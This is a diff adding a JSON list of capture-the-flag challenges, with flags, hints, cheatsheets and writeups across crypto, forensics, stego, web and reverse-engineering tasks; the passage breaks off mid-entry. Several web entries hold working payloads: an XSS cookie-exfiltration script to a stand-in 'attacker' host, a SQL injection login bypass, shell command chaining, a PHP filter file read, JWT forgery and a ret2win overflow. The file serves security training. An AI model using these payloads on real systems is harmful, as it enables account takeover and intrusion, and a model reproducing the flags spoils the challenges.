@@ -1,0 +1,869 @@
+[
+  {
+    "id": "crypto-01",
+    "title": "Caesar's Ghost",
+    "category": "Cryptography",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "Intercepted communications from an LGU regional office use an outdated substitution cipher. Recover the plaintext flag from: 'synt{P4rf4e_Vf_Qrnq_Ybat_Yvir_EBG13}'.",
+    "flag": "flag{Caesar_Is_Dead_Long_Live_ROT13}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-01.txt",
+    "hints": [
+      {
+        "text": "The shift is a standard casual obfuscation alphabet rotation.",
+        "penalty": 10
+      },
+      {
+        "text": "Try ROT13 (shift of 13 positions).",
+        "penalty": 20
+      }
+    ],
+    "concept": "Classical substitution ciphers (ROT13 / Caesar cipher)",
+    "cheatsheet": "echo 'synt{P4rf4e_Vf_Qrnq_Ybat_Yvir_EBG13}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+    "badge": "Cipher Novice",
+    "writeup": "The ciphertext uses ROT13. Because ROT13 is self-inverse, applying the same transform again recovers the flag."
+  },
+  {
+    "id": "crypto-02",
+    "title": "The Vigen\u00e8re Ledger",
+    "category": "Cryptography",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A leaked municipal budget ledger was encrypted with a repeating-key polyalphabetic cipher. The key is a 4-letter government agency acronym. Recover the flag.",
+    "flag": "flag{V1g3n3r3_K3y_Wa5_DICT}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-02.enc",
+    "hints": [
+      {
+        "text": "Use Kasiski examination or index of coincidence to determine key length.",
+        "penalty": 15
+      },
+      {
+        "text": "The key is 4 letters relating to the competition organizing department.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Vigen\u00e8re cipher cryptanalysis and frequency analysis",
+    "cheatsheet": "CyberChef 'Vigen\u00e8re Decode' with key 'DICT'",
+    "badge": "Frequency Analyst",
+    "writeup": "Kasiski examination reveals key period of 4. Frequency analysis on columns isolates the key 'DICT'."
+  },
+  {
+    "id": "crypto-03",
+    "title": "RSA Low Public Exponent",
+    "category": "Cryptography",
+    "points": 400,
+    "difficulty": "Hard",
+    "description": "A legacy token signing service uses RSA with e=3 and no OAEP padding. Given public modulus n, e=3, and ciphertext c, recover the plaintext flag.",
+    "flag": "flag{Cub3_R00t_Att4ck_On_R54}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-03.json",
+    "hints": [
+      {
+        "text": "When m^e < n, modular reduction never occurs: c = m^3.",
+        "penalty": 20
+      },
+      {
+        "text": "Calculate the exact integer cube root of c directly.",
+        "penalty": 25
+      }
+    ],
+    "concept": "RSA low public exponent (e=3) unpadded cube-root attack",
+    "cheatsheet": "python3 -c \"import gmpy2; print(bytes.fromhex(hex(gmpy2.iroot(c,3)[0])[2:]))\"",
+    "badge": "RSA Breaker",
+    "writeup": "Since m^3 < n, c = m^3 in standard integers. Taking the integer cube root recovers the plaintext directly."
+  },
+  {
+    "id": "crypto-04",
+    "title": "Fullwidth Hex Embezzlement",
+    "category": "Cryptography",
+    "points": 200,
+    "difficulty": "Medium",
+    "description": "An anonymous whistleblower email contained fullwidth hex encoded bytes (/EF/BC/B6...). Decode the fullwidth Unicode characters to reveal the hidden base64 token.",
+    "flag": "flag{Th3_Emb3zzl3r_15_Fumie}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-04.txt",
+    "hints": [
+      {
+        "text": "Convert hex stream to UTF-8 bytes to reveal fullwidth characters (e.g. \uff36\uff27\uff48\uff5a).",
+        "penalty": 15
+      },
+      {
+        "text": "Normalize Unicode fullwidth ASCII characters to standard ASCII, then decode base64.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Unicode fullwidth homoglyph obfuscation & layered encoding",
+    "cheatsheet": "python3 -c \"import unicodedata; print(unicodedata.normalize('NFKC', text))\"",
+    "badge": "Unicode Decoder",
+    "writeup": "Unhexing yields fullwidth ASCII characters '\uff36\uff27\uff48\uff5a...'. NFKC normalization yields standard base64 'VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==' which decodes to 'Th3_Emb3zzl3r_15_Fumie'."
+  },
+  {
+    "id": "crypto-05",
+    "title": "Known Plaintext XOR Stream",
+    "category": "Cryptography",
+    "points": 300,
+    "difficulty": "Medium",
+    "description": "An encrypted government payroll file used repeating-key XOR. The header of the file is known to always begin with 'CONFIDENTIAL_PAYROLL_2026'. Recover the XOR key.",
+    "flag": "flag{X0R_K3y_R3c0v3ry_Succ3ss}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-05.bin",
+    "hints": [
+      {
+        "text": "XOR property: Plaintext XOR Ciphertext = Key.",
+        "penalty": 15
+      },
+      {
+        "text": "XOR the known header bytes against the first 26 bytes of the ciphertext.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Known-plaintext attack (KPA) against repeating XOR stream",
+    "cheatsheet": "xortool -l <keylen> -c 20 encrypted.bin",
+    "badge": "Stream Cracker",
+    "writeup": "Because P ^ C = K, XORing the known header against the ciphertext reveals the repeating key."
+  },
+  {
+    "id": "crypto-06",
+    "title": "Small Prime Diffie-Hellman",
+    "category": "Cryptography",
+    "points": 350,
+    "difficulty": "Hard",
+    "description": "An insecure IoT water management device negotiates session keys using Diffie-Hellman with a tiny 48-bit prime modulus p. Compute the shared secret.",
+    "flag": "flag{D1ff13_H3llm4n_Sm4ll_P_Br0k3n}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/crypto/crypto-06.json",
+    "hints": [
+      {
+        "text": "Tiny prime modulus means the discrete logarithm problem is solvable in seconds.",
+        "penalty": 20
+      },
+      {
+        "text": "Use Baby-step Giant-step or Pollard's rho algorithm to find the private exponent.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Discrete Logarithm Problem (DLP) over small primes",
+    "cheatsheet": "sage: discrete_log(A, Mod(g, p))",
+    "badge": "Discrete Log Wizard",
+    "writeup": "Using SageMath's discrete_log or sympy.discrete_log, solve for private key a in g^a = A mod p in under 1 second."
+  },
+  {
+    "id": "forensics-01",
+    "title": "Deleted But Not Gone",
+    "category": "Forensics",
+    "points": 150,
+    "difficulty": "Easy",
+    "description": "A seized flash drive from a data breach suspect was wiped before arrest. Analyze the raw disk image to carve out the deleted text document.",
+    "flag": "flag{F1l3_C4rv1ng_101}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/usb_image.dd",
+    "hints": [
+      {
+        "text": "Filesystem deletion unlinks metadata, but file bytes remain in unallocated space.",
+        "penalty": 10
+      },
+      {
+        "text": "Use foremost or photorec signature-based file carving.",
+        "penalty": 20
+      }
+    ],
+    "concept": "File carving and unallocated space data recovery",
+    "cheatsheet": "foremost -i usb_image.dd -o carved_output/ ; strings usb_image.dd | grep flag{",
+    "badge": "Carving Specialist",
+    "writeup": "Foremost scans magic bytes and extracts unlinked files from unallocated clusters, uncovering the deleted flag document."
+  },
+  {
+    "id": "forensics-02",
+    "title": "DNS Exfiltration in PCAP",
+    "category": "Forensics",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "An alert triggered on high volume DNS traffic from a provincial server. Inspect the packet capture to reassemble the data exfiltrated via DNS subdomain labels.",
+    "flag": "flag{DN5_Tunn3l1ng_C4ught}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/capture.pcapng",
+    "hints": [
+      {
+        "text": "Filter for DNS queries with unusual subdomains: dns.qry.name.",
+        "penalty": 15
+      },
+      {
+        "text": "Extract and concatenate the hex/base64 subdomain strings from queries.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Network traffic analysis and DNS tunneling protocol exfiltration",
+    "cheatsheet": "tshark -r capture.pcapng -Y \"dns.qry.type == 1\" -T fields -e dns.qry.name | sort -u",
+    "badge": "Packet Detective",
+    "writeup": "Tshark isolates DNS queries targeting attacker domain. Decoding concatenated subdomain prefixes reveals the exfiltrated flag."
+  },
+  {
+    "id": "forensics-03",
+    "title": "RAM Process Injection",
+    "category": "Forensics",
+    "points": 400,
+    "difficulty": "Hard",
+    "description": "A memory acquisition was captured from a compromised workstation. Identify the hollowed process and extract the in-memory injected payload string.",
+    "flag": "flag{V0l4t1l1ty_F1nd5_Pr0c3ss_Inj3ct10n}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/memdump.raw",
+    "hints": [
+      {
+        "text": "Use Volatility 3 to inspect running processes and unbacked memory pages.",
+        "penalty": 15
+      },
+      {
+        "text": "Execute windows.malfind to spot PAGE_EXECUTE_READWRITE permissions.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Memory forensics, process hollowing, and Volatility malfind analysis",
+    "cheatsheet": "volatility3 -f memdump.raw windows.pslist ; volatility3 -f memdump.raw windows.malfind",
+    "badge": "Memory Forensics Specialist",
+    "writeup": "windows.malfind flags svchost.exe with unmapped executable memory containing a shellcode payload with the embedded flag."
+  },
+  {
+    "id": "forensics-04",
+    "title": "Corrupted ZIP Magic Bytes",
+    "category": "Forensics",
+    "points": 200,
+    "difficulty": "Medium",
+    "description": "An intercepted ZIP archive has corrupted header bytes ('DEADBEEF') causing unzip errors. Fix the header signature and extract important.bmp.",
+    "flag": "flag{M4g1c_Byt3s_P4tch3d}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/broken_head.zip",
+    "hints": [
+      {
+        "text": "Inspect the first 4 bytes using a hex editor like hexyl, xxd, or bless.",
+        "penalty": 10
+      },
+      {
+        "text": "Standard ZIP local file header starts with 50 4B 03 04 ('PK..').",
+        "penalty": 20
+      }
+    ],
+    "concept": "File signature (magic byte) analysis and header restoration",
+    "cheatsheet": "printf '\\x50\\x4B\\x03\\x04' | dd of=broken_head.zip conv=notrunc count=4 bs=1",
+    "badge": "Hex Doctor",
+    "writeup": "Replacing the 4-byte 'DEADBEEF' corrupt header with '50 4B 03 04' restores the zip archive structure, allowing full extraction."
+  },
+  {
+    "id": "forensics-05",
+    "title": "PDF FlateDecode Stream Carving",
+    "category": "Forensics",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A suspicious government policy circular in PDF format contains a hidden object stream compressed with /FlateDecode. Extract the decompressed stream.",
+    "flag": "flag{Fl4t3_D3c0mp4ss_Str34m}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/document.pdf",
+    "hints": [
+      {
+        "text": "Use pdf-parser.py or qpdf to extract compressed object streams.",
+        "penalty": 15
+      },
+      {
+        "text": "qpdf --qdf --object-streams=disable input.pdf decompressed.pdf",
+        "penalty": 20
+      }
+    ],
+    "concept": "PDF object structure and zlib / FlateDecode decompression",
+    "cheatsheet": "qpdf --qdf --object-streams=disable doc.pdf out.pdf && grep -a flag{ out.pdf",
+    "badge": "PDF Analyst",
+    "writeup": "QPDF or pdf-parser decompress all deflate streams, revealing hidden raw JavaScript and embedded flag."
+  },
+  {
+    "id": "forensics-06",
+    "title": "Decrypted TLS Session Log",
+    "category": "Forensics",
+    "points": 350,
+    "difficulty": "Hard",
+    "description": "Given an encrypted HTTPS packet capture and an extracted SSLKEYLOGFILE, decrypt the HTTPS streams to extract the administrator's POST credentials.",
+    "flag": "flag{TL5_D3crypt10n_M4st3r}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/forensics/https_traffic.pcapng",
+    "hints": [
+      {
+        "text": "Configure Wireshark (Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename).",
+        "penalty": 15
+      },
+      {
+        "text": "In tshark: -o \"tls.keylog_file:keys.log\" -Y \"http.request.method==POST\".",
+        "penalty": 25
+      }
+    ],
+    "concept": "TLS session key decryption and encrypted packet analysis",
+    "cheatsheet": "tshark -r https_traffic.pcapng -o \"tls.keylog_file:keys.log\" -Y http -T fields -e http.file_data",
+    "badge": "TLS Decryptor",
+    "writeup": "Loading the keylog file decrypts TLS 1.3 traffic, revealing the HTTP POST payload and flag."
+  },
+  {
+    "id": "stego-01",
+    "title": "Hidden in the Low Bits",
+    "category": "Steganography",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "An official DICT regional badge PNG was published online. Extract the hidden token embedded in the low-order bit planes of the pixel array.",
+    "flag": "flag{zsteg_1sb_m4st3r}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/badge.png",
+    "hints": [
+      {
+        "text": "Examine least significant bits across color channels.",
+        "penalty": 15
+      },
+      {
+        "text": "Run zsteg with full auto-analysis mode (-a).",
+        "penalty": 20
+      }
+    ],
+    "concept": "Least Significant Bit (LSB) steganography in PNG images",
+    "cheatsheet": "zsteg -a badge.png",
+    "badge": "Stego Sleuth",
+    "writeup": "Running 'zsteg -a badge.png' tests all prime bit planes and surfaces the ASCII flag on b1,b,lsb,xy."
+  },
+  {
+    "id": "stego-02",
+    "title": "Audio Between the Lines",
+    "category": "Steganography",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "An intercepted radio transmission WAV file from a coastal maritime alert system contains hidden text encoded into its acoustic frequency spectrum.",
+    "flag": "flag{5p3ctr0gr4m_S3cr3ts}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/transmission.wav",
+    "hints": [
+      {
+        "text": "Audio information can be hidden visually in the frequency domain.",
+        "penalty": 15
+      },
+      {
+        "text": "Render the audio spectrogram using sox, Audacity, or Sonic Visualiser.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Audio spectrogram steganography and visual frequency encoding",
+    "cheatsheet": "sox transmission.wav -n spectrogram -o spectrogram.png && feh spectrogram.png",
+    "badge": "Sound Wave Sleuth",
+    "writeup": "Generating a spectrogram using Sox or Audacity visualizes the audio frequencies, rendering the flag text clearly."
+  },
+  {
+    "id": "stego-03",
+    "title": "Exif Metadata Leak",
+    "category": "Steganography",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "An unscrubbed photograph of a municipal data center was uploaded. Inspect the metadata tags to extract the hidden equipment tag.",
+    "flag": "flag{3x1ft00l_M3t4d4t4_L34k}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/datacenter.jpg",
+    "hints": [
+      {
+        "text": "Digital cameras and software store extensive metadata inside image headers.",
+        "penalty": 10
+      },
+      {
+        "text": "Use exiftool to inspect XPComment, Copyright, and UserComment fields.",
+        "penalty": 15
+      }
+    ],
+    "concept": "EXIF metadata analysis and header extraction",
+    "cheatsheet": "exiftool datacenter.jpg | grep -i flag",
+    "badge": "EXIF Investigator",
+    "writeup": "Running exiftool on the JPEG exposes the flag stored inside the XPComment tag."
+  },
+  {
+    "id": "stego-04",
+    "title": "PNG IHDR Height Tampering",
+    "category": "Steganography",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A cropped PNG certificate contains a CRC mismatch error. The true height of the image was deliberately shrunken to conceal the lower half.",
+    "flag": "flag{PNG_1HDR_H31ght_F1x3d}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/tampered.png",
+    "hints": [
+      {
+        "text": "PNG CRC chunk checksum does not match the dimensions in the IHDR chunk.",
+        "penalty": 15
+      },
+      {
+        "text": "Fix the height bytes in IHDR or use a script to brute-force matching CRC dimensions.",
+        "penalty": 25
+      }
+    ],
+    "concept": "PNG IHDR chunk tampering and aspect ratio restoration",
+    "cheatsheet": "python3 -c \"import zlib, struct; ...\" or hexedit IHDR height bytes",
+    "badge": "Image Surgeon",
+    "writeup": "Modifying the IHDR height bytes to match the original CRC reveals the concealed bottom banner containing the flag."
+  },
+  {
+    "id": "stego-05",
+    "title": "Appended Archive Carving",
+    "category": "Steganography",
+    "points": 150,
+    "difficulty": "Easy",
+    "description": "A JPEG wallpaper appears normal in photo viewers, but has an unexpectedly large file size. Inspect and carve out the appended archive.",
+    "flag": "flag{B1nw4lk_Jp3g_C4rv1ng}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/wallpaper.jpg",
+    "hints": [
+      {
+        "text": "JPEG files terminate at End-Of-Image marker (FF D9). Anything after is ignored by viewers.",
+        "penalty": 10
+      },
+      {
+        "text": "Use binwalk -e to automatically detect and carve trailing zip or rar archives.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Trailing payload injection and binwalk archive carving",
+    "cheatsheet": "binwalk -e wallpaper.jpg ; unzip _wallpaper.jpg.extracted/*.zip",
+    "badge": "Archive Carvery",
+    "writeup": "Binwalk extracts the hidden ZIP archive appended after the JPEG FF D9 marker, which unpacks flag.txt."
+  },
+  {
+    "id": "stego-06",
+    "title": "Invisible Whitespace Stego",
+    "category": "Steganography",
+    "points": 300,
+    "difficulty": "Hard",
+    "description": "A text file containing municipal ordinances appears to have trailing invisible tabs and spaces at the end of each line. Decode the binary whitespace stream.",
+    "flag": "flag{Wh1t3sp4c3_St3g4n0gr4phy}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/stego/ordinance.txt",
+    "hints": [
+      {
+        "text": "Spaces represent 0 and tabs represent 1 (or SNOW whitespace encryption).",
+        "penalty": 15
+      },
+      {
+        "text": "Use stegsnow -C ordinance.txt or a python whitespace-to-ascii binary converter.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Whitespace steganography (SNOW / trailing spaces/tabs)",
+    "cheatsheet": "stegsnow -C ordinance.txt",
+    "badge": "Ghost In The Space",
+    "writeup": "Stegsnow extracts the concealed message from trailing whitespace sequences, revealing the flag."
+  },
+  {
+    "id": "web-01",
+    "title": "SQLi on the Citizen Portal",
+    "category": "Web Exploitation",
+    "points": 200,
+    "difficulty": "Easy",
+    "description": "A mock citizen services login portal is vulnerable to classic SQL injection. Bypass authentication to access the admin dashboard and retrieve the flag.",
+    "flag": "flag{0R_1_3qu4ls_1_4dm1n_Byp4ss}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-01.txt",
+    "hints": [
+      {
+        "text": "The login form concatenates user input directly into a SQL query.",
+        "penalty": 10
+      },
+      {
+        "text": "Try a classic authentication bypass payload: admin' OR '1'='1' -- -",
+        "penalty": 20
+      }
+    ],
+    "concept": "SQL injection \u2014 authentication bypass via unsanitized query concatenation",
+    "cheatsheet": "username: admin' OR '1'='1'-- -",
+    "badge": "Query Breaker",
+    "writeup": "The SQL query closes early and bypasses password check. Use the in-app interactive sandbox to execute!",
+    "sandbox_type": "sqli"
+  },
+  {
+    "id": "web-02",
+    "title": "The Reflected Cookie Thief",
+    "category": "Web Exploitation",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A mock feedback form on a regional government microsite reflects user comments without escaping. Craft a script to exfiltrate the admin session cookie.",
+    "flag": "flag{XSS_C00k1e_3xf1ltr4t10n}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-02.txt",
+    "hints": [
+      {
+        "text": "The comment input is rendered into the DOM without htmlspecialchars.",
+        "penalty": 15
+      },
+      {
+        "text": "Inject <script>fetch('http://attacker/?c=' + document.cookie)</script>",
+        "penalty": 20
+      }
+    ],
+    "concept": "Reflected Cross-Site Scripting (XSS) leading to session cookie exfiltration",
+    "cheatsheet": "<script>fetch('http://attacker/?c='+document.cookie)</script>",
+    "badge": "XSS Assassin",
+    "writeup": "Inputting an unescaped script tag executes in the simulated victim admin's context, leaking the session cookie.",
+    "sandbox_type": "xss"
+  },
+  {
+    "id": "web-03",
+    "title": "Broken Access Control: IDOR Files",
+    "category": "Web Exploitation",
+    "points": 200,
+    "difficulty": "Easy",
+    "description": "A document portal lets citizens download permit files by ID parameter. The endpoint fails to verify file ownership. Enumerate privileged document IDs.",
+    "flag": "flag{1D0R_D0cum3nt_L34k}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-03.txt",
+    "hints": [
+      {
+        "text": "Notice the numerical parameter: ?id=101.",
+        "penalty": 10
+      },
+      {
+        "text": "Test common privileged IDs like 1337 or 7.",
+        "penalty": 15
+      }
+    ],
+    "concept": "Insecure Direct Object Reference (IDOR) \u2014 missing authorization controls",
+    "cheatsheet": "curl -s \"https://target/api/v1/download?id=1337\"",
+    "badge": "Access Control Auditor",
+    "writeup": "Changing the document ID from 101 to 1337 bypasses authorization and downloads confidential DICT directives.",
+    "sandbox_type": "idor"
+  },
+  {
+    "id": "web-04",
+    "title": "Command Injection in Network Probe",
+    "category": "Web Exploitation",
+    "points": 300,
+    "difficulty": "Medium",
+    "description": "A web router diagnostics tool takes an IP address and runs system ping without sanitizing shell metacharacters. Chain commands to read flag.txt.",
+    "flag": "flag{C0mm4nd_1nj3ct10n_P1ng_Byp4ss}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-04.txt",
+    "hints": [
+      {
+        "text": "The backend runs system('ping -c 1 ' + ip).",
+        "penalty": 15
+      },
+      {
+        "text": "Use command delimiters like ; or | or $(cat flag.txt).",
+        "penalty": 20
+      }
+    ],
+    "concept": "OS Command Injection via unsanitized system() execution",
+    "cheatsheet": "127.0.0.1; cat flag.txt # or 127.0.0.1 | cat flag.txt",
+    "badge": "Command Infiltrator",
+    "writeup": "Inputting '127.0.0.1; cat flag.txt' executes the second shell command in the context of the web server."
+  },
+  {
+    "id": "web-05",
+    "title": "JWT Algorithm 'none' Bypass",
+    "category": "Web Exploitation",
+    "points": 350,
+    "difficulty": "Hard",
+    "description": "An authentication gateway validates JSON Web Tokens but accepts the 'none' signature algorithm. Modify the token payload to claim role: 'superadmin'.",
+    "flag": "flag{JWT_N0n3_Alg0r1thm_Byp4ss}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-05.txt",
+    "hints": [
+      {
+        "text": "Decode the JWT header (base64) and change 'alg': 'HS256' to 'alg': 'none'.",
+        "penalty": 20
+      },
+      {
+        "text": "Change payload role to 'superadmin' and remove the signature part: <header>.<payload>.",
+        "penalty": 25
+      }
+    ],
+    "concept": "JSON Web Token (JWT) signature bypass via algorithm 'none'",
+    "cheatsheet": "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, '', algorithm='none'))\"",
+    "badge": "Token Forger",
+    "writeup": "Re-encoding the header with alg=none and omitting the signature bypasses verification on vulnerable JWT parsers."
+  },
+  {
+    "id": "web-06",
+    "title": "Local File Inclusion (LFI)",
+    "category": "Web Exploitation",
+    "points": 300,
+    "difficulty": "Medium",
+    "description": "A PHP template loader loads page components via ?page=home.php. Use directory traversal and PHP wrappers to read confidential source code.",
+    "flag": "flag{LF1_Php_F1lt3r_B4s364}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/web/web-06.txt",
+    "hints": [
+      {
+        "text": "Use directory traversal ../ to escape the template directory.",
+        "penalty": 15
+      },
+      {
+        "text": "Use php://filter/convert.base64-encode/resource=flag.php to prevent code execution and read raw source.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Local File Inclusion (LFI) and PHP stream wrappers",
+    "cheatsheet": "curl 'http://target/index.php?page=php://filter/convert.base64-encode/resource=flag.php'",
+    "badge": "LFI Master",
+    "writeup": "The php://filter wrapper base64-encodes the target file before PHP executes it, revealing the flag in the source code."
+  },
+  {
+    "id": "rev-01",
+    "title": "The Locked Keygen Binary",
+    "category": "Reverse Engineering",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A government utility binary requires a license key. Reverse engineer the validation routine to compute a valid key and reveal the flag.",
+    "flag": "flag{Ke7g3n_Cr4ck3d_Th3_L0g1c}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/licensed_app",
+    "hints": [
+      {
+        "text": "Disassemble check_license in Ghidra or IDA and inspect loop character transformations.",
+        "penalty": 15
+      },
+      {
+        "text": "Each character is XORed against a rolling counter and compared to a static array.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Static reverse engineering and keygen algorithm recovery",
+    "cheatsheet": "ghidra licensed_app ; objdump -d -M intel licensed_app",
+    "badge": "Reverse Engineer",
+    "writeup": "Reversing the XOR loop in Ghidra recovers the expected license string, which unlocks the flag."
+  },
+  {
+    "id": "rev-02",
+    "title": "Anti-Debug Maze",
+    "category": "Reverse Engineering",
+    "points": 400,
+    "difficulty": "Hard",
+    "description": "A hardened binary detects debuggers via ptrace(PTRACE_TRACEME) before running. Bypass the anti-debugging check to reach the flag routine.",
+    "flag": "flag{Ptr4c3_D3t3ct10n_D3f34t3d}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/hardened_app",
+    "hints": [
+      {
+        "text": "The binary calls ptrace(0, 0, 1, 0). If it returns -1, it exits early.",
+        "penalty": 20
+      },
+      {
+        "text": "Patch the conditional jump (e.g. JNZ -> JZ or NOP) or hook ptrace via LD_PRELOAD.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Anti-debugging evasion, ptrace bypass, and binary patching",
+    "cheatsheet": "gdb -q ./hardened_app ; (gdb) set $rax=0 or patch with radare2 'wa nop'",
+    "badge": "Debugger Whisperer",
+    "writeup": "Hooking ptrace or patching the conditional branch allows debugger attachment without triggering evasion exits."
+  },
+  {
+    "id": "rev-03",
+    "title": "Packed ELF with UPX",
+    "category": "Reverse Engineering",
+    "points": 150,
+    "difficulty": "Easy",
+    "description": "An incident triage extracted an unknown executable from a compromised server. The binary is packed. Unpack it to extract the embedded flag.",
+    "flag": "flag{UPX_Unp4ck3d_Succ3ss}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/packed_binary",
+    "hints": [
+      {
+        "text": "Check file strings: strings packed_binary | grep UPX.",
+        "penalty": 10
+      },
+      {
+        "text": "Run upx -d to decompress the binary.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Executable packing, UPX headers, and binary decompression",
+    "cheatsheet": "upx -d packed_binary -o unpacked && strings unpacked | grep flag{",
+    "badge": "Unpacker",
+    "writeup": "Decompressing with 'upx -d' recovers the original ELF binary where strings immediately reveals the flag."
+  },
+  {
+    "id": "rev-04",
+    "title": "Decompiling Python Bytecode",
+    "category": "Reverse Engineering",
+    "points": 200,
+    "difficulty": "Easy",
+    "description": "Only a compiled Python .pyc file was recovered from an exfiltration script. Decompile the bytecode to recover the original source code.",
+    "flag": "flag{Pyc_D3c0mp1l3d_Cl34n}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/script.pyc",
+    "hints": [
+      {
+        "text": "Python .pyc files contain marshal serialized code objects with magic numbers.",
+        "penalty": 10
+      },
+      {
+        "text": "Use decompyle++ (pycdc) or uncompyle6 to regenerate readable Python.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Python bytecode decompilation and opcode reconstruction",
+    "cheatsheet": "pycdc script.pyc > recovered.py # or uncompyle6 script.pyc",
+    "badge": "Bytecode Analyst",
+    "writeup": "Pycdc accurately decompiles the bytecode into readable Python functions, exposing the hardcoded flag."
+  },
+  {
+    "id": "rev-05",
+    "title": "Buffer Overflow ret2win",
+    "category": "Reverse Engineering",
+    "points": 450,
+    "difficulty": "Hard",
+    "description": "A legacy C daemon has a vulnerable gets() call and no stack canaries. Overwrite the saved return address (RIP) to jump directly to win().",
+    "flag": "flag{R3t2w1n_St4ck_0v3rwr1t3}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/vuln_server",
+    "hints": [
+      {
+        "text": "Calculate offset to RIP using cyclic pattern: 72 bytes.",
+        "penalty": 20
+      },
+      {
+        "text": "Find win() address via objdump -d vuln_server | grep win.",
+        "penalty": 25
+      }
+    ],
+    "concept": "Buffer overflow, stack frame layout, and ret2win control flow hijacking",
+    "cheatsheet": "python3 -c \"import pwn; elf=pwn.ELF('./vuln_server'); print(b'A'*72 + pwn.p64(elf.symbols['win']))\"",
+    "badge": "Binary Exploiter",
+    "writeup": "Crafting a 72-byte padding plus 8-byte win() address overrides the return address on function epilogue."
+  },
+  {
+    "id": "rev-06",
+    "title": "Android APK Secret Asset",
+    "category": "Reverse Engineering",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "A regional mobile contact tracing APK holds a hardcoded API token. Decompile the APK and locate the obfuscated string in MainActivity.",
+    "flag": "flag{J4dx_Andr01d_Apk_S3cr3t}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/rev/app.apk",
+    "hints": [
+      {
+        "text": "Use jadx-gui to decompile classes.dex into Java source code.",
+        "penalty": 15
+      },
+      {
+        "text": "Search for 'apiKey' or inspect res/values/strings.xml.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Android reverse engineering, APK decompilation, and JADX inspection",
+    "cheatsheet": "jadx -d out app.apk && grep -rn \"flag{\" out/",
+    "badge": "Android Hacker",
+    "writeup": "Jadx decompiles the APK into Java code. Searching strings.xml or MainActivity reveals the stored flag."
+  },
+  {
+    "id": "misc-01",
+    "title": "The LGU Social Media Trail",
+    "category": "Misc/OSINT",
+    "points": 150,
+    "difficulty": "Easy",
+    "description": "An LGU IT officer posted a photo of a new server rack. A monitor in the background shows internal host configuration. Extract the hostname.",
+    "flag": "flag{OS1NT_Sp0tt3d_1n_Th3_B4ckgr0und}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/social_post.png",
+    "hints": [
+      {
+        "text": "Zoom and adjust contrast on the background terminal display.",
+        "penalty": 10
+      },
+      {
+        "text": "The prompt displays user@internal-gateway-01.lgu.local.",
+        "penalty": 20
+      }
+    ],
